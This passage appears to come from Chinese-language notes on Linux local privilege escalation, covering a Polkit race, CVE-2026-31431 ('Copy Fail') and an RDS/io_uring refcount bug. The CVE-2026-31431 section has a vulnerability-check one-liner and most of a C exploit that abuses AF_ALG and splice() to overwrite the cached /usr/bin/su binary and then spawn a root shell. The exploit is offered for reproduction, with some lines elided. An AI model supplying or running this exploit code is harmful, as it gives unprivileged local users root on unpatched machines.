...
原理：非管理用户进行命令操作后的瞬间,杀死命令,会导致Polkit认为该命令是管理员命令,从而可以利用这个创建sudo用户

## CVE-2026-31431

前置/影响范围：2017 年之后引入相关优化的内核版本，多数主流发行版默认受影响（未打补丁）

* 影响版本：72548b093ee3 <= commit < a664bf3d603d

* 验证当前内核是否受到影响

  ```
  python3 -c 'import socket; s=socket.socket(38,5,0); (s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))")) or print("no")) if s else None' 2>/dev/null || echo "yes"
  ```

原理：代号 “Copy Fail”。可导致本地低权限攻击者利用 AF_ALG 加密接口与 splice() 系统调用，实现向任意可读文件的页缓存中写入受控的4字节数据，进而通过篡改 setuid 二进制文件获得 root 权限等危害。

漏洞复现程序（来自https://github.com/0xShe/CVE-2026-31431/blob/main/exploit.c）
...
void exploit_step(int fd_su, int offset, unsigned char *chunk) {
    int tfm_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "aead", .salg_name = "authencesn(hmac(sha256),cbc(aes))" };
    bind(tfm_fd, (struct sockaddr *)&sa, sizeof(sa));

    unsigned char key[40] = {0};
    key[0] = 0x08; key[1] = 0x00; key[2] = 0x01; key[3] = 0x00; key[7] = 0x10;
    setsockopt(tfm_fd, SOL_ALG, ALG_SET_KEY, key, 40);
    uint32_t authsize = 4;
    setsockopt(tfm_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, authsize);

    int op_fd = accept(tfm_fd, NULL, 0);
    char buffer[8];
    memset(buffer, 'A', 4); memcpy(buffer + 4, chunk, 4);

    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = buffer, .iov_len = 8 };
    ...
    cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_OP; cmsg->cmsg_len = CMSG_LEN(4);
    *(int *)CMSG_DATA(cmsg) = 0;

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_IV; cmsg->cmsg_len = CMSG_LEN(20);
    ((char *)CMSG_DATA(cmsg))[0] = 0x10;

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG; cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN; cmsg->cmsg_len = CMSG_LEN(4);
    ((char *)CMSG_DATA(cmsg))[0] = 0x08; 

    sendmsg(op_fd, &msg, MSG_MORE);

    int pipes[2]; pipe(pipes);
    loff_t off_su = 0; 
    splice(fd_su, &off_su, pipes[1], NULL, offset + 4, SPLICE_F_MOVE);
    splice(pipes[0], NULL, op_fd, NULL, offset + 4, SPLICE_F_MOVE);

    char dummy[2048];
    read(op_fd, dummy, 8 + offset);

    close(op_fd); close(tfm_fd); close(pipes[0]); close(pipes[1]);
}

int main() {
    int fd_su = open("/usr/bin/su", O_RDONLY);
    if (fd_su < 0) fd_su = open("/bin/su", O_RDONLY);
    if (fd_su < 0) { perror("open su"); return 1; }

    printf("[*] Starting exploit...\n");
    for (int i = 0; i < sizeof(payload); i += 4) {
        exploit_step(fd_su, i, &payload[i]);
    }

    printf("[+] Exploit finished, running su...\n");
    system("su");
    return 0;
}
```
...
前置：linux内核版本>6.12（io_uring支持IORING_REGISTER_CLONE_BUFFERS），系统开启了RDS模块和io_uring

原理：利用非法的减少内存页引用计数，替换su文件的缓存内容。

漏洞复现程序文件（来自https://github.com/v12-security/pocs/blob/main/pintheft/poc.c）
